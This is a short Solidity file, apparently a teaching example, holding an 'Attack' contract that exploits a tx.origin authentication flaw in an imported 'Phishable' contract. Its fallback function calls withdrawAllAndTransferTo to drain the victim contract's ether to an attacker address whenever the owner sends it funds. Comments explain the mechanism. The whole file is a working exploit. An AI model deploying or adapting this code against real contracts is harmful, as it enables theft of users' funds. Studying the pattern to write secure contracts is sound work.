import "Phishable.sol";

contract Attack {

    Phishable phishableContract;
    address attacker;

    constructor(Phishable _phishableContract, address _attackerAddress) {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    // Owner of phishableContract sends ether to Attack,
    // Attack's fallback gets invoked, and calls withdrawAllAndTransferTo
    // with tx.origin == owner, so call does not revert 
    // and funds of phishableContract gets transfered to the attacker
    function () payable {
        phishableContract.withdrawAllAndTransferTo(attacker);
    }

}
